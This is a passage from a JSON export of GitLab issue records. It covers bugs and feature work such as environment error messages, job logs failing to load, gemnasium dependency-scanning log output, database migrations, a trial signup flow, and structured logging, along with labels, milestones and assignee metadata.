--\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### Available Tier\n\n~\"GitLab Free\"\n\n\u003c!-- This section should be used for setting the appropriate tier that this feature will belong to. Pricing can be found here: https://about.gitlab.com/pricing/\n\n* Free\n* Premium/Silver\n* Ultimate/Gold\n--\u003e\n\n### What does success look like, and how can we measure that?\n\nCustomers are able to fix this problem after their first encounter with the error message, and the absolute number of failed pipelines due to invalid environments drops.\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n--\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers --\u003e\n- [Casey - the Release and Change Management Director](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/buyer-persona/#casey---the-release-and-change-management-director)\n- [Dakota - the Application Development Director](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/buyer-persona/#dakota---the-application-development-director)\n- [Kennedy - the Infrastructure Engineering Director](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/buyer-persona/#kennedy---the-infrastructure-engineering-director)\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references\n\n- This is a follow-up of https://gitlab.com/gitlab-org/gitlab/-/issues/21182\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-08-02T09:19:38.882Z","updated_at":"2022-12-16T14:21:37.973Z","closed_at":"2022-07-28T04:26:46.432Z","closed_by":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"labels":["Category:Environment Management","Deliverable","GitLab Free","Next Up","Release::P1","SUS::Impacting","UI text","UX","approaching-SLO","auto updated","backend","backend-weight::1","customer","devops::release","group::release","missed-SLO","priority::2","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"}],"author":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"type":"ISSUE","assignee":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"user_notes_count":47,"merge_requests_count":0,"upvotes":4,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337417","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337417","notes":"https://gitlab.com/api/v4/projects/278964/issues/337417/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337417/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337417","relative":"#337417","full":"gitlab-org/gitlab#337417"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91254585,"iid":337415,"project_id":278964,"title":"Allow spaces to appear between number and unit in formatter in corpus management","description":"### Description\n\nThe following discussion from !67284 should be addressed:\n\n- [ ] @mrincon started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67284#note_640693472): \n\n    \u003e As mentioned by @farias-gl over slack, we should be able to have a space between the number and units in the formatter. I'll open a follow-up issue for this.","state":"closed","created_at":"2021-08-02T08:59:27.417Z","updated_at":"2022-04-25T03:22:33.016Z","closed_at":"2022-04-20T14:36:09.753Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["devops::secure","feature::enhancement","frontend","fuzzing::coverage","group::composition analysis","missed:14.7","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"}],"author":{"id":1607849,"username":"mrincon","name":"Miguel Rincon","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1607849/avatar.png","web_url":"https://gitlab.com/mrincon"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337415","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337415","notes":"https://gitlab.com/api/v4/projects/278964/issues/337415/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337415/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337415","relative":"#337415","full":"gitlab-org/gitlab#337415"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91253254,"iid":337414,"project_id":278964,"title":"Use schema search path to hide CI tables in main database","description":"## Problem\n\nWe need a way to detect cross-database joins\n\n## Proposal\n\n- Use schema search path to hide CI tables (`gitlab_ci` schema) in main database. But only for dev, and test","state":"closed","created_at":"2021-08-02T08:44:48.964Z","updated_at":"2022-05-31T12:22:04.626Z","closed_at":"2022-04-12T02:34:14.088Z","closed_by":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"labels":["Category:Pods","[deprecated] Accepting merge requests","auto updated","ci-decomposition-followup","devops::data_stores","group::pods","section::enablement","type::feature"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"type":"ISSUE","assignee":null,"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337414","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337414","notes":"https://gitlab.com/api/v4/projects/278964/issues/337414/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337414/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337414","relative":"#337414","full":"gitlab-org/gitlab#337414"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6451,"epic":{"id":314946,"iid":6451,"title":"Use database SCHEMAs to better isolated CI decomposed features","url":"/groups/gitlab-org/-/epics/6451","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e546\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":91247661,"iid":337408,"project_id":278964,"title":"Frontend: Job logs no longer showing","description":"Since today we noticed that our job logs are no longer showing and keep loading. It affects all our projects ands jobs for all colleagues. A.t.m. this blocks us from doing specific releases because we can't validate the output.\n\n![image](/uploads/5cc09f22c28aaeb77f0c807cbab76d26/image.png)\n\n\n### Workaround\n\n- [Upgrade GitLab Runner to the latest version](https://gitlab.com/gitlab-org/gitlab/-/issues/337408#note_642275880).\n\n### Zendesk Reports (GitLab Internal)\n\n- https://gitlab.zendesk.com/agent/tickets/228281\n- https://gitlab.zendesk.com/agent/tickets/228299\n- https://gitlab.zendesk.com/agent/tickets/228284\n- https://gitlab.zendesk.com/agent/tickets/227989\n- https://gitlab.zendesk.com/agent/tickets/227938\n- https://gitlab.zendesk.com/agent/tickets/228258\n- https://gitlab.zendesk.com/agent/tickets/228111\n- https://gitlab.zendesk.com/agent/tickets/228297","state":"closed","created_at":"2021-08-02T07:36:07.063Z","updated_at":"2022-08-01T00:56:04.441Z","closed_at":"2022-07-26T21:51:53.627Z","closed_by":{"id":4512666,"username":"jheimbuck_gl","name":"James Heimbuck","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8dd2ef9c1cacb6e80d7ca47db6f0ce22?s=80\u0026d=identicon","web_url":"https://gitlab.com/jheimbuck_gl"},"labels":["Category:Continuous Integration","FY23::Q2","OKR","Stretch","Verify::P3","approaching-SLO","automation:ml","automation:ml wrong","customer","devops::verify","frontend","group::pipeline execution","missed-SLO","priority::2","regression","regression:14.2","reproduced on GitLab.com","section::dev","severity::2","type::bug","workflow::blocked"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":4483272,"username":"ruben.kruiver","name":"Ruben Kruiver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4483272/avatar.png","web_url":"https://gitlab.com/ruben.kruiver"},"type":"ISSUE","assignee":null,"user_notes_count":99,"merge_requests_count":0,"upvotes":8,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337408","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337408","notes":"https://gitlab.com/api/v4/projects/278964/issues/337408/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337408/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337408","relative":"#337408","full":"gitlab-org/gitlab#337408"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91240797,"iid":337402,"project_id":278964,"title":"Output warning when gemnasium-python/maven finds multiple supported directories","description":"### Problem to solve \n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for previous problem to solve\u003c/summary\u003e\n\u003cpre\u003e\n\nWhile investigating [Flaky unit test on finder module (broken master)](https://gitlab.com/gitlab-org/gitlab/-/issues/337276#note_640108032), we realized that it would be useful to have `gemnasium-maven` and `gemnasium-python` output a warning message when multiple directories are discovered with supported files, but only one is passed to the scanner because users might not be aware of what's been skipped.\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n`gemnasium-maven` and `gemnasium-python` should output an `INFO` log message informing users when a matching dependency file has been found, and that all other dependency files (if they exist) will be skipped.\n\n### Implementation plan \n\nUpdate [findProjects](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/blob/242dd66/finder/finder.go#L49-49) to output an `INFO` log message when a matching dependency file has been found.\n\nFor example, here are the following `DEBUG` log messages when `gemnasium-python` runs:\n\n```\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ scanning directory: .\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ skip ignored directory: .git\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ scanning directory: a\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ electing pip for pypi because this is the first match\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ electing pip for pypi because this is the first match\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ skipping sub-directories\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ skipping other trees\n[DEBU] [gemnasium-python] [2021-08-17T08:22:51Z] ▶ Exporting dependencies for /test-project/a/requirements.txt\n```\n\nWe should add an `INFO` message at the same stage where the `Exporting dependencies for...` log message is output, with the following text:\n\n```\nDetected supported dependency files in directory 'a'. Files in this directory will be processed and any\nother dependendency files, if they exist, will be skipped.\n```\n\n- [x] update `gemnasium` to add the log message (https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/merge_requests/247)\n- [x] update `gemnasium-python` with submodule version set to above (https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-python/-/merge_requests/126)\n- [x] update `gemnasium-maven` with `go.mod` checkout to be the above (https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/merge_requests/139)\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n### User experience goal\n\nUsers will understand exactly which directories were skipped when running `gemnasium-maven` or `gemnasium-python`.\n\n### What does success look like, and how can we measure that?\n\nAn `INFO` log message is output explaining which directories were skipped when running `gemnasium-maven` or `gemnasium-python`.\n\n### What is the type of buyer?\n\n~\"GitLab Ultimate\" ~\"Enterprise Edition\" \n\n### Is this a cross-stage feature?\n\nNo, this only affects dependency scanning\n\n### Testing\n\nSET to implement a test to parse the logs for detected dependency files in our secure test projects.\n\n/cc @gonzoyumo @NicoleSchwartz @fcatteau","state":"closed","created_at":"2021-08-02T05:04:31.326Z","updated_at":"2021-12-18T07:03:03.839Z","closed_at":"2021-12-09T10:48:37.766Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Deliverable","Enterprise Edition","GitLab Ultimate","backend","devops::secure","feature::enhancement","group::composition analysis","missed-deliverable","missed:14.5","quad-planning::complete-action","section::sec","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"}],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337402","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337402","notes":"https://gitlab.com/api/v4/projects/278964/issues/337402/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337402/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337402","relative":"#337402","full":"gitlab-org/gitlab#337402"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91175983,"iid":337364,"project_id":278964,"title":"Add default value and respective migration on DB level for approval_project_rules table","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nAs [suggested](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66679#note_639937195) by the maintainer during review it is recommended to have the default value and respective migration (for existing nil records) for `vulnerabilities_allowed` column in `approval_project_rules` table.\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\n- [ ] ~backend Add default value (0) with change_column_default as part of a migration\n- [ ] ~backend Possibly as part of the same migration update the existing records containing `nil` value to the same value as set by default.\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-07-30T23:00:09.997Z","updated_at":"2022-03-16T11:40:06.404Z","closed_at":"2021-08-23T18:40:37.876Z","closed_by":{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"labels":["Category:Security Policy Management","Deliverable","Enterprise Edition","auto updated","backend","database","devops::govern","group::security policies","section::sec","secure merge request approval","type::maintenance","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"}],"author":{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"type":"ISSUE","assignee":{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337364","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":9,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 9 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337364","notes":"https://gitlab.com/api/v4/projects/278964/issues/337364/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337364/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337364","relative":"#337364","full":"gitlab-org/gitlab#337364"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6261,"epic":{"id":298070,"iid":6261,"title":"Allow for granular vulnerability check approval rules","url":"/groups/gitlab-org/-/epics/6261","group_id":9970,"human_readable_end_date":"Nov 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91173246,"iid":337354,"project_id":278964,"title":"Trial Workflow from Self-Manage does not link to marketing form","description":"\n### Summary\n\nAttempting to start a trial from the self managed instance navigates the user to the Customer's Portal page.  Then completing the form eventually.  \n\n### Steps to reproduce\n\n**Option 1:**\n1. Initiate `Start free trial` from a self-managed instance.\n2. Supply info as requested once in Customers Portal, trial form.\n3. Start your free trial\n\n**Option 2:**\n1. Initiate `Start free trial` from a self-managed instance.\n2. From Customer Portal page, click on sign-in, top right corner.\n3. Register for a new account/login\n\n### What is the current *bug* behavior?\n\nThe trial flow does not use the Marketo form.\n\n### What is the expected *correct* behavior?\n\nAccording to this [slack thread](https://gitlab.slack.com/archives/CRM7PCFSR/p1627672197005600), the CTA should take the user to the marketing [trial form](https://about.gitlab.com/free-trial/).  In addition to that, there should be a page added when the email address has already started a trial and that page should indicate that the instance has already completed a trial with a “buy now” CTA. \n\n### Relevant video\n\n![Kapture_2021-07-30_at_14.19.43](/uploads/27d54fdb8c5c48ac7e86f51d26db06da/Kapture_2021-07-30_at_14.19.43.gif)\n\n### Proposal\n- For this iteration (14.2), we only need to change the entry point within the self-managed instance to the following Marketo [trial form](https://about.gitlab.com/free-trial/)\n- Provisioning of actual activation code within the trial email is not part of this bug fix.\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\nAn end-to-end test is suggested for testing the trial registration flow for self-managed.  This test [currently exists for SaaS](https://gitlab.com/gitlab-org/gitlab/-/blob/707ee96e0d71cd55a0531e38c3762af025c1c404/qa/qa/specs/features/ee/browser_ui/fulfillment/purchase/free_trial_spec.rb), but lacks for self-managed.","state":"closed","created_at":"2021-07-30T20:28:45.203Z","updated_at":"2021-10-14T09:42:45.309Z","closed_at":"2021-10-14T09:42:45.295Z","closed_by":{"id":1986039,"username":"lulalala","name":"Mark Chao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1986039/avatar.png","web_url":"https://gitlab.com/lulalala"},"labels":["Cloud License Sync - V2","[deprecated] Category:Provision","auto updated","backend","devops::fulfillment","group::provision","missed:14.3","quad-planning::complete-action","section::fulfillment","type::feature","workflow::in dev"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":1986039,"username":"lulalala","name":"Mark Chao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1986039/avatar.png","web_url":"https://gitlab.com/lulalala"}],"author":{"id":7971452,"username":"teresatison","name":"Teresa Tison","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7971452/avatar.png","web_url":"https://gitlab.com/teresatison"},"type":"ISSUE","assignee":{"id":1986039,"username":"lulalala","name":"Mark Chao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1986039/avatar.png","web_url":"https://gitlab.com/lulalala"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337354","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337354","notes":"https://gitlab.com/api/v4/projects/278964/issues/337354/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337354/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337354","relative":"#337354","full":"gitlab-org/gitlab#337354"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91171793,"iid":337351,"project_id":278964,"title":"Use Structured Logging for MergeRequestMergeabilityCheckWorker","description":"In https://gitlab.com/gitlab-org/gitlab/-/issues/336979 we identified a number of issues with the MergeRequestMergeabilityCheckWorker. Here was one of the findings:\n\n\u003e The `MergeRequestMergeabilityCheckWorker` uses unstructured logging which is almost impossible to investigate at the volumes we see on GitLab.com.\n\u003e\n\u003e Switching to structured logging, or passing the error back via Sidekiq would be preferable.\n\nSee: https://docs.gitlab.com/ee/development/logging.html#gitlab-developers-guide-to-logging","state":"closed","created_at":"2021-07-30T19:29:06.336Z","updated_at":"2021-10-27T10:38:53.594Z","closed_at":"2021-08-09T20:03:13.172Z","closed_by":{"id":142752,"username":"garyh","name":"Gary Holtz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/142752/avatar.png","web_url":"https://gitlab.com/garyh"},"labels":["Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","auto updated","backend","devops::create","group::code review","infradev","priority::3","section::dev","severity::3","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":142752,"username":"garyh","name":"Gary 